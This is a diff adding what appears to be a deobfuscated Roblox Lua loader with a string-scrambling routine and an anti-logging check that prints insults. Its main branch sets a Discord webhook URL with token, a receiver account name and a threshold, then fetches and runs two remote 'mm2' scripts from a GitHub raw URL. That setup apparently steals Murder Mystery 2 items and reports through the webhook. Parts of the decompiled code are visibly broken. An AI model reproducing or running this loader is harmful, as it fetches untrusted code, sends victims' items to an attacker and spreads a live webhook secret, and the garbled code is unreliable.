@@ -1,0 +1,146 @@
+-- ts file was generated at discord.gg/25ms
+
+local lookup = {}
+local items = {}
+local floor_fn = math.floor
+local random_fn = math.random
+local remove_fn = table.remove
+local char_fn = string.char
+local n1 = 0
+local n2 = 2
+local items_ref = items
+local n3 = 1
+
+for i = 1, 256, 1 do
+    lookup[i] = i
+end
+
+local v0 = #lookup
+local v1 = #lookup == 0
+
+repeat
+    v1 = random_fn(1, #lookup)
+    v0 = remove_fn(lookup, v1)
+    n3 = char_fn(v0 - 1)
+    items_ref[v0] = n3
+until #lookup == 0
+
+v1 = {}
+v0 = v1
+
+local callback_fn = function(arg1, arg2, arg3, arg4)
+    local v0
+
+    if #0 == 0 then
+        n1 = (n1 * 221 + 26150364950415) % 35184372088832
+
+        repeat until false
+
+        v0 = floor_fn(n1 / 2 ^ (13 - (n2 - n2 % 32) / 32))
+
+        floor_fn((((v0 % 4294967296) / 2 ^ (n2 % 32)) % 1) * 4294967296)
+        floor_fn((v0 % 4294967296) / 2 ^ (n2 % 32))
+    end
+
+    return table.remove(v0)
+end
+local callback_fn_ref = callback_fn
+
+callback_fn = {}
+n3 = callback_fn
+
+setmetatable({}, {
+    __index = callback_fn,
+    __metatable = nil,
+})
+
+callback_fn = function(arg1, arg2)
+    local items_ref_ref, v0, n1, v1, v2
+    local n3_ref = n3
+
+    if n3[arg2] then
+    else
+        items_ref_ref = items_ref
+        v0 = string.len(arg1)
+        n3_ref[arg2] = ''
+        n1 = 40
+
+        for i = 1, v0.len(arg1), 1 do
+            v2 = string.byte(arg1, i)
+            v1 = callback_fn_ref()
+            n3_ref[arg2] = n3_ref[arg2] .. items_ref_ref[((v2 + v1) + n1) % 256 + 1]
+        end
+    end
+
+    return arg2
+end
+random_fn = {}
+n2 = tostring(random_fn)
+
+local v2 = string.sub(n2, 8, 15)
+
+char_fn = string.sub
+items = tostring({})
+n1 = string.sub(items, 8, 15)
+
+if v2 == n1 then
+    n1 = math.random()
+    _G.elysium_was_here = n1
+
+    if _G.elysium_was_here > 0 then
+        print('yk i always wonder if skids like you have a life outside of discord lmfao')
+    else
+        if _G.elysium_was_here >= 0.2 then
+            print('you must be a loser irl to be this chronically online in discord')
+        else
+            if _G.elysium_was_here >= 0.4 then
+                print('what a sad way to spend your time honestly')
+            else
+                if _G.elysium_was_here >= 0.6 then
+                    print('remember to take a shower! you stink lil bro')
+                else
+                    print('imagine trying to log roblox scripts in 2026 you are a certified loser')
+                end
+            end
+        end
+    end
+
+    return
+else
+    char_fn = getgenv()
+    char_fn.WEBHOOK = 'https://discord.com/api/webhooks/1526183732225118298/rQYsNH6zKPX37Fsz_gclamZdIfvQcWmXNRupc3lRJfg6NXYj1zzvtIOo3P7NGxsgTUWR'
+    char_fn = getgenv()
+    v2 = {
+        'fearjxaimlock',
+    }
+    char_fn.RECEIVERS = v2
+    char_fn = getgenv()
+    char_fn.THRESHOLD = 20
+    v2 = function(arg1, arg2, arg3, arg4)
+        local v0
+        local items = {
+            game:HttpGet('https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2.lua'),
+        }
+
+        v0()
+
+        return
+    end
+
+    task.spawn(v2)
+
+    v2 = function(arg1, arg2)
+        local v0
+        local items = {
+            game:HttpGet('https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2_visual.lua'),
+        }
+
+        v0()
+
+        return
+    end
+
+    task.spawn(v2)
+
+    return
+end
